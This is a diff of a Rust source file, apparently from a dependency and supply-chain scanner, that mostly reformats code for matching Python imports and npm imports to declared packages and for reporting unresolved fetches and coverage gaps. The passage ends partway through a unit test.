@@ -1661,26 +1661,43 @@ impl PythonNamespaces {
     fn from_report(report: &AnalysisReport) -> Self {
         let mut roots: HashMap<String, HashSet<String>> = HashMap::new();
         for file in &report.files {
-            let Some((archive, member)) = file.path.rsplit_once("!!") else { continue; };
-            if member.contains("##") || !python_runtime_module_file(member) { continue; }
+            let Some((archive, member)) = file.path.rsplit_once("!!") else {
+                continue;
+            };
+            if member.contains("##") || !python_runtime_module_file(member) {
+                continue;
+            }
             let first = member.split('/').next().unwrap_or_default();
-            let module = if member.contains('/') { first } else { first.split('.').next().unwrap_or_default() };
+            let module = if member.contains('/') {
+                first
+            } else {
+                first.split('.').next().unwrap_or_default()
+            };
             if python_module_root(module) {
-                roots.entry(archive.to_owned()).or_default().insert(module.to_owned());
+                roots
+                    .entry(archive.to_owned())
+                    .or_default()
+                    .insert(module.to_owned());
             }
         }
         Self(roots)
     }
 
     fn resolves(&self, path: &str, module: &str) -> bool {
-        let Some((archive, _)) = path.rsplit_once("!!") else { return false; };
-        self.0.get(archive).is_some_and(|roots| roots.contains(module.split('.').next().unwrap_or_default()))
+        let Some((archive, _)) = path.rsplit_once("!!") else {
+            return false;
+        };
+        self.0
+            .get(archive)
+            .is_some_and(|roots| roots.contains(module.split('.').next().unwrap_or_default()))
     }
 }
 
 fn python_module_root(module: &str) -> bool {
     let mut chars = module.chars();
-    chars.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+    chars
+        .next()
+        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
         && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
@@ -1695,34 +1712,65 @@ fn is_python_import_candidate(reference: &Reference) -> bool {
 /// A wheel's root namespace is evidence for a possible provider, not proof
 /// of the imported runtime's distribution, version, or import reachability.
 fn python_candidate_provides_namespace(reference: &Reference, report: &AnalysisReport) -> bool {
-    let Some(root) = report.files.first() else { return false; };
-    if root.file_type != "whl" { return false; }
+    let Some(root) = report.files.first() else {
+        return false;
+    };
+    if root.file_type != "whl" {
+        return false;
+    }
     let module = reference.evidence.split('.').next().unwrap_or_default();
     let prefix = format!("{}!!", root.path);
     report.files.iter().any(|file| {
-        let Some(member) = file.path.strip_prefix(&prefix) else { return false; };
-        if member.contains("!!") || member.contains("##") || !python_runtime_module_file(member) { return false; }
+        let Some(member) = file.path.strip_prefix(&prefix) else {
+            return false;
+        };
+        if member.contains("!!") || member.contains("##") || !python_runtime_module_file(member) {
+            return false;
+        }
         member.split('/').next().is_some_and(|first| {
-            if member.contains('/') { first == module } else { first.split('.').next() == Some(module) }
+            if member.contains('/') {
+                first == module
+            } else {
+                first.split('.').next() == Some(module)
+            }
         })
     })
 }
 
 /// Severe observations about one candidate's code or registry metadata.
 fn candidate_static_issues(report: &AnalysisReport) -> std::collections::BTreeSet<String> {
-    report.files.iter().flat_map(|file| &file.findings)
+    report
+        .files
+        .iter()
+        .flat_map(|file| &file.findings)
         .filter(|finding| finding.crit >= cleave::Criticality::Suspicious)
-        .map(|finding| format!("{}:{}", if finding.crit == cleave::Criticality::Hostile { "hostile" } else { "suspicious" }, finding.id))
+        .map(|finding| {
+            format!(
+                "{}:{}",
+                if finding.crit == cleave::Criticality::Hostile {
+                    "hostile"
+                } else {
+                    "suspicious"
+                },
+                finding.id
+            )
+        })
         .collect()
 }
 
 /// Do not graft an unrelated same-named PyPI project onto the importer.
 /// A namespace check still leaves the installed distribution/version unknown.
-fn annotate_python_import_candidate(record: &mut FetchRecord, reference: &Reference, report: Option<&AnalysisReport>, registry_issues: Option<&std::collections::BTreeSet<String>>) -> bool {
+fn annotate_python_import_candidate(
+    record: &mut FetchRecord,
+    reference: &Reference,
+    report: Option<&AnalysisReport>,
+    registry_issues: Option<&std::collections::BTreeSet<String>>,
+) -> bool {
     let verified = delivered_bytes(record)
         && report.is_some_and(|report| python_candidate_provides_namespace(reference, report));
     if verified {
-        let note = "Python import candidate; namespace present; installed distribution/version unknown";
+        let note =
+            "Python import candidate; namespace present; installed distribution/version unknown";
         record.coverage_note = Some(match record.coverage_note.take() {
             Some(existing) => format!("{existing}; {note}"),
             None => note.to_owned(),
@@ -1732,10 +1780,16 @@ fn annotate_python_import_candidate(record: &mut FetchRecord, reference: &Refere
         // Keep severe observations about the rejected *candidate* reviewable
         // without turning them into findings about the importing artifact.
         let mut issues = report.map(candidate_static_issues).unwrap_or_default();
-        if let Some(registry_issues) = registry_issues { issues.extend(registry_issues.iter().cloned()); }
+        if let Some(registry_issues) = registry_issues {
+            issues.extend(registry_issues.iter().cloned());
+        }
         if !issues.is_empty() {
             let shown: Vec<_> = issues.iter().take(3).cloned().collect();
-            note.push_str(&format!("; candidate static issues: {} unique severe findings ({})", issues.len(), shown.join(", ")));
+            note.push_str(&format!(
+                "; candidate static issues: {} unique severe findings ({})",
+                issues.len(),
+                shown.join(", ")
+            ));
         }
         record.coverage_note = Some(note);
     }
@@ -2006,47 +2060,76 @@ fn declared_npm_imports_in_hop(
     report: &AnalysisReport,
     worklist: &[Group],
 ) -> HashMap<String, HashMap<String, Reference>> {
-    let manifests: HashMap<&str, &cleave::types::FileAnalysis> = report.files.iter()
+    let manifests: HashMap<&str, &cleave::types::FileAnalysis> = report
+        .files
+        .iter()
         .filter(|f| f.path.ends_with("/package.json"))
-        .map(|f| (f.path.as_str(), f)).collect();
+        .map(|f| (f.path.as_str(), f))
+        .collect();
     let mut declarations: HashMap<&str, HashMap<String, Reference>> = HashMap::new();
     for (sha, refs) in worklist {
-        for r in refs.iter().filter(|r| r.kind == RefKind::Dependency
-            && !r.evidence.contains("npm:")
-            && !r.context.as_ref().is_some_and(|c| c.scope == filefacts::DependencyScope::Development)) {
+        for r in refs.iter().filter(|r| {
+            r.kind == RefKind::Dependency
+                && !r.evidence.contains("npm:")
+                && !r
+                    .context
+                    .as_ref()
+                    .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
+        }) {
             if let Some(name) = npm_import_name(r) {
-                declarations.entry(sha.as_str()).or_default().insert(name, r.clone());
+                declarations
+                    .entry(sha.as_str())
+                    .or_default()
+                    .insert(name, r.clone());
             }
         }
     }
     let mut result: HashMap<String, HashMap<String, Reference>> = HashMap::new();
     for file in &report.files {
-        if !matches!(file.file_type.as_str(), "javascript" | "typescript") { continue; }
+        if !matches!(file.file_type.as_str(), "javascript" | "typescript") {
+            continue;
+        }
         let mut dir = virtual_parent(&file.path);
         let mut names = HashMap::new();
         while let Some(current) = dir {
             let path = format!("{current}/package.json");
             if let Some(manifest) = manifests.get(path.as_str()) {
-                names = declarations.get(manifest.sha256.as_str()).cloned().unwrap_or_default();
+                names = declarations
+                    .get(manifest.sha256.as_str())
+                    .cloned()
+                    .unwrap_or_default();
                 break;
             }
             dir = virtual_parent(&current);
         }
-        result.entry(file.sha256.clone())
-            .and_modify(|existing| existing.retain(|name, reference| names.get(name) == Some(reference)))
+        result
+            .entry(file.sha256.clone())
+            .and_modify(|existing| {
+                existing.retain(|name, reference| names.get(name) == Some(reference))
+            })
             .or_insert(names);
     }
     result
 }
 
 fn python_distribution_name(reference: &Reference) -> Option<String> {
-    let RefLocator::Purl(raw) = &reference.locator else { return None; };
+    let RefLocator::Purl(raw) = &reference.locator else {
+        return None;
+    };
     let purl = fletch::purl::Purl::parse(raw).ok()?;
-    if purl.typ() != "pypi" || !purl.namespace().is_empty() { return None; }
+    if purl.typ() != "pypi" || !purl.namespace().is_empty() {
+        return None;
+    }
     let mut name = String::new();
     for ch in purl.name().chars() {
-        let ch = if matches!(ch, '_' | '.' | '-') { '-' } else { ch.to_ascii_lowercase() };
-        if ch != '-' || !name.ends_with('-') { name.push(ch); }
+        let ch = if matches!(ch, '_' | '.' | '-') {
+            '-'
+        } else {
+            ch.to_ascii_lowercase()
+        };
+        if ch != '-' || !name.ends_with('-') {
+            name.push(ch);
+        }
     }
     Some(name)
 }
@@ -2054,42 +2137,86 @@ fn python_distribution_name(reference: &Reference) -> Option<String> {
 /// Python declarations constrain matching distribution-name candidates. This
 /// is not a general module-to-distribution mapping. Stop at the nearest package
 /// boundary; identical source bytes must agree across all supplied contexts.
-fn reconcile_python_imports(report: &AnalysisReport, worklist: &mut [Group], dependencies: bool) -> Vec<(String, Reference)> {
-    let candidate_sources: HashSet<&str> = worklist.iter().filter(|(_, refs)| refs.iter().any(is_python_import_candidate)).map(|(sha, _)| sha.as_str()).collect();
-    if candidate_sources.is_empty() { return Vec::new(); }
+fn reconcile_python_imports(
+    report: &AnalysisReport,
+    worklist: &mut [Group],
+    dependencies: bool,
+) -> Vec<(String, Reference)> {
+    let candidate_sources: HashSet<&str> = worklist
+        .iter()
+        .filter(|(_, refs)| refs.iter().any(is_python_import_candidate))
+        .map(|(sha, _)| sha.as_str())
+        .collect();
+    if candidate_sources.is_empty() {
+        return Vec::new();
+    }
     let mut source_refs: HashMap<&str, Vec<Reference>> = HashMap::new();
-    for (sha, refs) in worklist.iter() { source_refs.entry(sha).or_default().extend(refs.iter().cloned()); }
+    for (sha, refs) in worklist.iter() {
+        source_refs
+            .entry(sha)
+            .or_default()
+            .extend(refs.iter().cloned());
+    }
     let mut owners: HashMap<String, HashMap<String, Vec<Reference>>> = HashMap::new();
     for file in &report.files {
         let basename = file.path.rsplit(['/', '!']).next().unwrap_or_default();
         let mut owner = virtual_parent(&file.path).unwrap_or_else(|| ".".into());
-        let manifest = matches!(basename, "pyproject.toml" | "requirements.txt" | "setup.py" | "setup.cfg" | "poetry.lock" | "uv.lock" | "pdm.lock" | "Pipfile" | "Pipfile.lock");
+        let manifest = matches!(
+            basename,
+            "pyproject.toml"
+                | "requirements.txt"
+                | "setup.py"
+                | "setup.cfg"
+                | "poetry.lock"
+                | "uv.lock"
+                | "pdm.lock"
+                | "Pipfile"
+                | "Pipfile.lock"
+        );
         if file.file_type == "whl" {
             owner = format!("{}!!", file.path);
         } else if basename == "METADATA" && owner.ends_with(".dist-info") {
             owner = virtual_parent(&owner).unwrap_or_else(|| ".".into());
-        } else if !manifest { continue; }
+        } else if !manifest {
+            continue;
+        }
         let names = owners.entry(owner).or_default();
         for reference in source_refs.get(file.sha256.as_str()).into_iter().flatten() {
-            if reference.kind != RefKind::Dependency { continue; }
-            if let Some(name) = python_distribution_name(reference) { names.entry(name).or_default().push(reference.clone()); }
+            if reference.kind != RefKind::Dependency {
+                continue;
+            }
+            if let Some(name) = python_distribution_name(reference) {
+                names.entry(name).or_default().push(reference.clone());
+            }
         }
     }
     for names in owners.values_mut() {
         for refs in names.values_mut() {
-            let reconciled: Vec<_> = refs.iter().map(|r| fletch::fetch::prefer_lock_pin(r, refs)).collect();
+            let reconciled: Vec<_> = refs
+                .iter()
+                .map(|r| fletch::fetch::prefer_lock_pin(r, refs))
+                .collect();
             *refs = reconciled;
         }
     }
     // A content hash can occur in multiple packages. Preserve every applicable
     // constraint, and remember any context with no declaration for that name.
-    let mut contexts: HashMap<String, (usize, HashMap<String, (usize, Vec<Reference>)>)> = HashMap::new();
+    type NameRefs = HashMap<String, (usize, Vec<Reference>)>;
+    let mut contexts: HashMap<String, (usize, NameRefs)> = HashMap::new();
     for file in &report.files {
-        if file.file_type != "python" || file.path.ends_with(".pyi") || !candidate_sources.contains(file.sha256.as_str()) { continue; }
+        if file.file_type != "python"
+            || file.path.ends_with(".pyi")
+            || !candidate_sources.contains(file.sha256.as_str())
+        {
+            continue;
+        }
         let mut dir = Some(virtual_parent(&file.path).unwrap_or_else(|| ".".into()));
         let mut names = HashMap::new();
         while let Some(current) = dir {
-            if let Some(found) = owners.get(&current) { names = found.clone(); break; }
+            if let Some(found) = owners.get(&current) {
+                names = found.clone();
+                break;
+            }
             dir = virtual_parent(&current);
         }
         let (count, bindings) = contexts.entry(file.sha256.clone()).or_default();
@@ -2107,18 +2234,34 @@ fn reconcile_python_imports(report: &AnalysisReport, worklist: &mut [Group], dep
         for reference in std::mem::take(refs) {
             let binding = is_python_import_candidate(&reference)
                 .then(|| python_distribution_name(&reference))
-                .flatten().and_then(|name| { let (total, names) = contexts.get(source)?; let (seen, refs) = names.get(&name)?; Some((*seen == *total, refs)) });
+                .flatten()
+                .and_then(|name| {
+                    let (total, names) = contexts.get(source)?;
+                    let (seen, refs) = names.get(&name)?;
+                    Some((*seen == *total, refs))
+                });
             if let Some((complete, declarations)) = binding.filter(|(_, decls)| !decls.is_empty()) {
-                if dependencies && complete { covered.push((source.clone(), reference)); continue; }
+                if dependencies && complete {
+                    covered.push((source.clone(), reference));
+                    continue;
+                }
                 if !dependencies {
                     for declaration in declarations {
                         let mut bound = reference.clone();
-                        bound.locator = declaration.locator.clone(); bound.pinned_hash = declaration.pinned_hash.clone(); bound.context = declaration.context.clone();
-                        if !updated.contains(&bound) { updated.push(bound); }
+                        bound.locator = declaration.locator.clone();
+                        bound.pinned_hash = declaration.pinned_hash.clone();
+                        bound.context = declaration.context.clone();
+                        if !updated.contains(&bound) {
+                            updated.push(bound);
+                        }
                     }
                 }
-                if !complete { updated.push(reference); }
-            } else { updated.push(reference); }
+                if !complete {
+                    updated.push(reference);
+                }
+            } else {
+                updated.push(reference);
+            }
         }
         *refs = updated;
     }
@@ -2224,16 +2367,30 @@ fn attribute_undeclared_npm_imports(report: &mut AnalysisReport, worklist: &[Gro
 
 /// Analysis gaps are per observed call, not guessed URL references. The same
 /// retained facts are available for roots and extracted/fetched members.
-fn unresolved_downloader_records(report: &AnalysisReport, policy: &FetchPolicy) -> Vec<FetchRecord> {
-    if !policy.wants(RefKind::UrlFetch) { return Vec::new(); }
+fn unresolved_downloader_records(
+    report: &AnalysisReport,
+    policy: &FetchPolicy,
+) -> Vec<FetchRecord> {
+    if !policy.wants(RefKind::UrlFetch) {
+        return Vec::new();
+    }
     let mut records = Vec::new();
     for file in &report.files {
-        if !policy.ci && is_ci_context(file) { continue; }
-        let Some(view) = &file.filefacts else { continue; };
+        if !policy.ci && is_ci_context(file) {
+            continue;
+        }
+        let Some(view) = &file.filefacts else {
+            continue;
+        };
         for call in find::discover_fetch_calls(&file.file_type, &view.symbols).unresolved {
-            let location = call.offset.map_or_else(String::new, |offset| format!(" at byte {offset}"));
+            let location = call
+                .offset
+                .map_or_else(String::new, |offset| format!(" at byte {offset}"));
             let mut record = FetchRecord::terminal(
-                format!("{} (unresolved downloader arguments){location} in {}", call.command, file.sha256),
+                format!(
+                    "{} (unresolved downloader arguments){location} in {}",
+                    call.command, file.sha256
+                ),
                 Outcome::Unresolved(fletch::fetch::Unresolved::Unsupported),
             );
             record.source_sha256 = Some(file.sha256.clone());
@@ -2249,20 +2406,37 @@ fn unresolved_downloader_records(report: &AnalysisReport, policy: &FetchPolicy) 
 /// POM declarations that need an effective Maven model are coverage gaps,
 /// never silently substituted with a latest version or Maven Central artifact.
 fn unresolved_maven_records(report: &AnalysisReport, policy: &FetchPolicy) -> Vec<FetchRecord> {
-    if !policy.wants(RefKind::Dependency) { return Vec::new(); }
+    if !policy.wants(RefKind::Dependency) {
+        return Vec::new();
+    }
     let mut records = Vec::new();
     for file in &report.files {
-        let Some(view) = &file.filefacts else { continue; };
-        let Some(gaps) = view.values.pointer("/jar/pom/dependency_gaps").and_then(serde_json::Value::as_array) else { continue; };
+        let Some(view) = &file.filefacts else {
+            continue;
+        };
+        let Some(gaps) = view
+            .values
+            .pointer("/jar/pom/dependency_gaps")
+            .and_then(serde_json::Value::as_array)
+        else {
+            continue;
+        };
         for gap in gaps {
-            let (Some(member), Some(reason)) = (gap.get("member").and_then(serde_json::Value::as_str), gap.get("reason").and_then(serde_json::Value::as_str)) else { continue; };
+            let (Some(member), Some(reason)) = (
+                gap.get("member").and_then(serde_json::Value::as_str),
+                gap.get("reason").and_then(serde_json::Value::as_str),
+            ) else {
+                continue;
+            };
             let mut record = FetchRecord::terminal(
                 format!("Maven POM {member} in {}: {reason}", file.sha256),
                 Outcome::Unresolved(fletch::fetch::Unresolved::Unsupported),
             );
             record.source_sha256 = Some(file.sha256.clone());
             record.kind = RefKind::Dependency;
-            record.coverage_note = Some(format!("analysis unavailable: Maven POM dependency: {reason}"));
+            record.coverage_note = Some(format!(
+                "analysis unavailable: Maven POM dependency: {reason}"
+            ));
             records.push(record);
         }
     }
@@ -2439,9 +2613,15 @@ impl FetchSession {
     /// Keep unresolved downloader calls and Maven declarations visible without
     /// inventing URLs, artifact coordinates, or effective-model defaults.
     fn record_unresolved_fetch_calls(&mut self, report: &AnalysisReport) {
-        for record in unresolved_downloader_records(report, &self.policy).into_iter()
-            .chain(unresolved_maven_records(report, &self.policy)) {
-            let key = (record.source_sha256.clone().unwrap_or_default(), record.source_offset, record.locator.clone());
+        for record in unresolved_downloader_records(report, &self.policy)
+            .into_iter()
+            .chain(unresolved_maven_records(report, &self.policy))
+        {
+            let key = (
+                record.source_sha256.clone().unwrap_or_default(),
+                record.source_offset,
+                record.locator.clone(),
+            );
             if self.unresolved_fetch_calls.insert(key) {
                 self.reporter.report(&record, "");
                 if let Reporter::Tree { tree, .. } = &self.reporter {
@@ -2506,12 +2686,22 @@ impl FetchSession {
             // constraint while following the observed import.
             let declared_imports = declared_npm_imports_in_hop(report, &worklist);
             let mut covered = Vec::new();
-            for (source, reference) in reconcile_python_imports(report, &mut worklist, self.policy.deps) {
-                let mut record = FetchRecord::terminal(locator(&reference).to_owned(), Outcome::Skipped);
-                record.source_sha256 = Some(source.clone()); record.source_offset = reference.offset; record.kind = reference.kind;
+            for (source, reference) in
+                reconcile_python_imports(report, &mut worklist, self.policy.deps)
+            {
+                let mut record =
+                    FetchRecord::terminal(locator(&reference).to_owned(), Outcome::Skipped);
+                record.source_sha256 = Some(source.clone());
+                record.source_offset = reference.offset;
+                record.kind = reference.kind;
                 record.coverage_note = Some("Python import candidate covered by separately reported declared requirement; installed provider/version unknown".into());
                 self.out.records.push(record);
-                covered.push(self.pending_entry(&source, &reference, hop, "declared Python requirement"));
+                covered.push(self.pending_entry(
+                    &source,
+                    &reference,
+                    hop,
+                    "declared Python requirement",
+                ));
             }
             for (source, refs) in &mut worklist {
                 refs.retain_mut(|reference| {
@@ -2772,7 +2962,9 @@ impl FetchSession {
                 record.source_offset = r.offset;
                 record.kind = r.kind;
                 record.context = r.context.clone();
-                record.coverage_note = Some(format!("analysis unavailable: downloader URL excluded by policy ({reason})"));
+                record.coverage_note = Some(format!(
+                    "analysis unavailable: downloader URL excluded by policy ({reason})"
+                ));
                 self.out.records.push(record);
                 continue;
             }
@@ -2914,7 +3106,9 @@ impl FetchSession {
     fn superseded(&self, r: &Reference) -> bool {
         // Python imports use their own nearest declaration, not a pin in an
         // unrelated package that merely shares the distribution spelling.
-        if is_python_import_candidate(r) { return false; }
+        if is_python_import_candidate(r) {
+            return false;
+        }
         let superseded = superseded_by_pin(r, &self.pinned);
         if superseded {
             tracing::debug!(
@@ -3270,12 +3464,21 @@ impl FetchSession {
         // so the package pass below can pair an artifact with its own registry
         // metadata (see `apply_package_composites`).
         let mut registry_findings: HashMap<String, Vec<Finding>> = HashMap::new();
-        let mut unverified_registry_issues: HashMap<String, std::collections::BTreeSet<String>> = HashMap::new();
-        let verified_python: HashSet<&str> = landed.iter().zip(&payloads)
-            .filter(|(landed, payload)| is_python_import_candidate(&landed.reference)
-                && delivered_bytes(&landed.record)
-                && payload.as_ref().and_then(|payload| payload.sub.as_ref())
-                    .is_some_and(|sub| python_candidate_provides_namespace(&landed.reference, sub)))
+        let mut unverified_registry_issues: HashMap<String, std::collections::BTreeSet<String>> =
+            HashMap::new();
+        let verified_python: HashSet<&str> = landed
+            .iter()
+            .zip(&payloads)
+            .filter(|(landed, payload)| {
+                is_python_import_candidate(&landed.reference)
+                    && delivered_bytes(&landed.record)
+                    && payload
+                        .as_ref()
+                        .and_then(|payload| payload.sub.as_ref())
+                        .is_some_and(|sub| {
+                            python_candidate_provides_namespace(&landed.reference, sub)
+                        })
+            })
             .map(|(landed, _)| landed.reference.evidence.as_str())
             .collect();
         for (gated, sub) in registries.into_iter().zip(subs) {
@@ -3285,7 +3488,10 @@ impl FetchSession {
                 && !verified_python.contains(gated.reference.evidence.as_str())
             {
                 if let Some(sub) = sub {
-                    unverified_registry_issues.entry(gated.reference.evidence).or_default().extend(candidate_static_issues(&sub));
+                    unverified_registry_issues
+                        .entry(gated.reference.evidence)
+                        .or_default()
+                        .extend(candidate_static_issues(&sub));
                 }
                 continue;
             }
@@ -3310,7 +3516,12 @@ impl FetchSession {
             }
             mark_peer_candidate(&mut l.record, &l.reference.source);
             if is_python_import_candidate(&l.reference) {
-                if !annotate_python_import_candidate(&mut l.record, &l.reference, payload.as_ref().and_then(|p| p.sub.as_ref()), unverified_registry_issues.get(&l.reference.evidence)) {
+                if !annotate_python_import_candidate(
+                    &mut l.record,
+                    &l.reference,
+                    payload.as_ref().and_then(|p| p.sub.as_ref()),
+                    unverified_registry_issues.get(&l.reference.evidence),
+                ) {
                     payload = None;
                 }
                 self.reporter.analyzed(&l.reference, &l.record);
@@ -3508,11 +3719,20 @@ impl FetchSession {
         // Check each fetched npm package in its own manifest context before
         // it is captured or merged into its parent's report.
         if let Some(sub) = &mut payload.sub
-            && let Some(root_path) = sub.files.first().filter(|f| f.file_type == "npm").map(|f| f.path.clone())
+            && let Some(root_path) = sub
+                .files
+                .first()
+                .filter(|f| f.file_type == "npm")
+                .map(|f| f.path.clone())
         {
-            let ci = if self.policy.ci { CiRefs::Include } else { CiRefs::Skip };
+            let ci = if self.policy.ci {
+                CiRefs::Include
+            } else {
+                CiRefs::Skip
+            };
             let bytes = self.res.cache.load(&l.record.locator);
-            let refs = collect_references_from_input(sub, Path::new(&root_path), bytes.as_deref(), ci);
+            let refs =
+                collect_references_from_input(sub, Path::new(&root_path), bytes.as_deref(), ci);
             attribute_undeclared_npm_imports(sub, &refs);
         }
         // Capture the dependency's standalone report before merge_payload
@@ -4468,10 +4688,10 @@ fn report_fetch(rec: &FetchRecord) {
         fg(DETAIL, &format!("{column:>10}")),
         crate::output::tty_text(fetch_target(rec))
     );
-    if analysis_unavailable(rec) {
-        if let Some(note) = &rec.coverage_note {
-            eprintln!("      {}", crate::output::tty_text(note));
-        }
+    if analysis_unavailable(rec)
+        && let Some(note) = &rec.coverage_note
+    {
+        eprintln!("      {}", crate::output::tty_text(note));
     }
 }
 
@@ -4485,9 +4705,14 @@ fn report_fetch(rec: &FetchRecord) {
 /// A corpus hit (see [`corpus_hit_record`]) is quiet for the same reason: the
 /// fleet already judged those bytes, so there is nothing here to look at.
 fn terminal_fetch_row_visible(rec: &FetchRecord) -> bool {
-    if analysis_unavailable(rec) { return true; }
+    if analysis_unavailable(rec) {
+        return true;
+    }
     match rec.outcome {
-        Outcome::Unresolved(_) => rec.coverage_note.as_deref().is_some_and(|note| note.starts_with("analysis unavailable")),
+        Outcome::Unresolved(_) => rec
+            .coverage_note
+            .as_deref()
+            .is_some_and(|note| note.starts_with("analysis unavailable")),
         Outcome::Skipped => false,
         Outcome::Failed(_) => !artifact_absent(rec),
         _ => true,
@@ -4495,7 +4720,9 @@ fn terminal_fetch_row_visible(rec: &FetchRecord) -> bool {
 }
 
 fn analysis_unavailable(rec: &FetchRecord) -> bool {
-    rec.coverage_note.as_deref().is_some_and(|note| note.starts_with("analysis unavailable"))
+    rec.coverage_note
+        .as_deref()
+        .is_some_and(|note| note.starts_with("analysis unavailable"))
 }
 
 /// Attention counts survive dropping the full report for terminal output.
@@ -4504,12 +4731,28 @@ pub(crate) fn dependency_attention(records: &[FetchRecord]) -> crate::engine::De
     let mut attention = crate::engine::DependencyAttention::default();
     for record in records {
         let note = record.coverage_note.as_deref().unwrap_or_default();
-        if note.contains("candidate static issues:") { attention.flagged_candidates += 1; }
-        if note.starts_with("analysis unavailable") || note.starts_with("analysis incomplete")
-            || note.starts_with("pending:") || note.contains("installed distribution/version unknown")
-            || matches!(record.outcome, Outcome::Failed(_) | Outcome::BudgetExceeded | Outcome::PinMismatch | Outcome::UnverifiablePin)
-            || (matches!(record.outcome, Outcome::Unresolved(_)) && matches!(record.kind, RefKind::Dependency | RefKind::Command | RefKind::UrlFetch))
-        { attention.gaps += 1; }
+        if note.contains("candidate static issues:") {
+            attention.flagged_candidates += 1;
+        }
+        if note.starts_with("analysis unavailable")
+            || note.starts_with("analysis incomplete")
+            || note.starts_with("pending:")
+            || note.contains("installed distribution/version unknown")
+            || matches!(
+                record.outcome,
+                Outcome::Failed(_)
+                    | Outcome::BudgetExceeded
+                    | Outcome::PinMismatch
+                    | Outcome::UnverifiablePin
+            )
+            || (matches!(record.outcome, Outcome::Unresolved(_))
+                && matches!(
+                    record.kind,
+                    RefKind::Dependency | RefKind::Command | RefKind::UrlFetch
+                ))
+        {
+            attention.gaps += 1;
+        }
     }
     attention
 }
@@ -4557,9 +4800,24 @@ impl FetchRow {
 /// way: a *fetched* dep the local bloom filters vouch for (or flag) is relabeled
 /// `known` instead of `live`/`cache`; `skip`/`fail` rows are left as-is.
 fn fetch_row(rec: &FetchRecord) -> FetchRow {
-    if analysis_unavailable(rec) && matches!(rec.outcome, Outcome::Ok | Outcome::Skipped | Outcome::Unresolved(_)) {
-        let flagged = rec.coverage_note.as_deref().is_some_and(|note| note.contains("candidate static issues:"));
-        return FetchRow::new('\u{26a0}', "gap", CAUTION).detail(if flagged { "candidate flagged" } else { "not verified" }.into());
+    if analysis_unavailable(rec)
+        && matches!(
+            rec.outcome,
+            Outcome::Ok | Outcome::Skipped | Outcome::Unresolved(_)
+        )
+    {
+        let flagged = rec
+            .coverage_note
+            .as_deref()
+            .is_some_and(|note| note.contains("candidate static issues:"));
+        return FetchRow::new('\u{26a0}', "gap", CAUTION).detail(
+            if flagged {
+                "candidate flagged"
+            } else {
+                "not verified"
+            }
+            .into(),
+        );
     }
     match &rec.outcome {
         Outcome::PinMismatch => {
@@ -5608,7 +5866,9 @@ fn collect_references_from_input(
                     &view.values,
                 ))
                 .filter(|reference| {
-                    if file.file_type == "python" && file.path.ends_with(".pyi") { return false; }
+                    if file.file_type == "python" && file.path.ends_with(".pyi") {
+                        return false;
+                    }
                     if is_python_import_candidate(reference)
                         && local_python.resolves(&file.path, &reference.evidence)
                     {
@@ -6828,30 +7088,38 @@ fn merge_payload(
     let first_new = report.files.len();
     for mut file in sub.files {
         // Preserve the payload's original paths for local package resolution.
-        if !is_vendored_node_module(&file.path) {
-            if let Some(view) = &file.filefacts {
-                let refs: Vec<_> = static_es_module_refs(&file.path, &file.file_type, &view.values)
-                    .into_iter()
-                    .chain(find::python_imports(&file.file_type, &view.symbols))
-                    .chain(find::import_calls(&file.file_type, &view.symbols).into_iter().filter(is_python_import_candidate))
-                    .filter(|r| {
-                        if file.file_type == "python" && file.path.ends_with(".pyi") { return false; }
-                        if is_python_import_candidate(r) && local_python.resolves(&file.path, &r.evidence) {
-                            return false;
-                        }
-                        npm_import_name(r).is_none_or(|name| {
-                            !local_npm.resolves(&file.path, &name)
-                                && !npm_import_is_package_or_framework_provided(
-                                    &file.path,
-                                    &name,
-                                    &package_contexts,
-                                )
-                        })
+        if !is_vendored_node_module(&file.path)
+            && let Some(view) = &file.filefacts
+        {
+            let refs: Vec<_> = static_es_module_refs(&file.path, &file.file_type, &view.values)
+                .into_iter()
+                .chain(find::python_imports(&file.file_type, &view.symbols))
+                .chain(
+                    find::import_calls(&file.file_type, &view.symbols)
+                        .into_iter()
+                        .filter(is_python_import_candidate),
+                )
+                .filter(|r| {
+                    if file.file_type == "python" && file.path.ends_with(".pyi") {
+                        return false;
+                    }
+                    if is_python_import_candidate(r)
+                        && local_python.resolves(&file.path, &r.evidence)
+                    {
+                        return false;
+                    }
+                    npm_import_name(r).is_none_or(|name| {
+                        !local_npm.resolves(&file.path, &name)
+                            && !npm_import_is_package_or_framework_provided(
+                                &file.path,
+                                &name,
+                                &package_contexts,
+                            )
                     })
-                    .collect();
-                if !refs.is_empty() {
-                    next.push((file.sha256.clone(), refs));
-                }
+                })
+                .collect();
+            if !refs.is_empty() {
+                next.push((file.sha256.clone(), refs));
             }
         }
         // The payload's own top node (the sub-report's root) is a fetched edge:
@@ -7015,17 +7283,40 @@ mod tests {
             {"id":3,"path":"bundle.zip!!b/requirements.txt","depth":1,"file_type":"requirements","sha256":"manifest-b","size":20},
             {"id":4,"path":"bundle.zip!!b/app.py","depth":1,"file_type":"python","sha256":"code-b","size":20}
         ]));
-        let declaration = |purl: &str| Reference::new(RefLocator::Purl(purl.into()), RefKind::Dependency, "requirements.txt", "some_pkg");
-        let import = || Reference::new(RefLocator::Purl("pkg:pypi/some_pkg".into()), RefKind::Command, "ast-python-import-candidate", "some_pkg.api");
+        let declaration = |purl: &str| {
+            Reference::new(
+                RefLocator::Purl(purl.into()),
+                RefKind::Dependency,
+                "requirements.txt",
+                "some_pkg",
+            )
+        };
+        let import = || {
+            Reference::new(
+                RefLocator::Purl("pkg:pypi/some_pkg".into()),
+                RefKind::Command,
+                "ast-python-import-candidate",
+                "some_pkg.api",
+            )
+        };
         let original = vec![
-            ("manifest-a".into(), vec![declaration("pkg:pypi/Some_Pkg?version_requirement=%3C2.0")]),
+            (
+                "manifest-a".into(),
+                vec![declaration("pkg:pypi/Some_Pkg?version_requirement=%3C2.0")],
+            ),
             ("code-a".into(), vec![import()]),
-            ("manifest-b".into(), vec![declaration("pkg:pypi/some-pkg@8.0")]),
+            (
+                "manifest-b".into(),
+                vec![declaration("pkg:pypi/some-pkg@8.0")],
+            ),
             ("code-b".into(), vec![import()]),
         ];
         let mut references_only = original.clone();
         assert!(reconcile_python_imports(&report, &mut references_only, false).is_empty());
-        assert_eq!(locator(&references_only[1].1[0]), "pkg:pypi/Some_Pkg?version_requirement=%3C2.0");
+        assert_eq!(
+            locator(&references_only[1].1[0]),
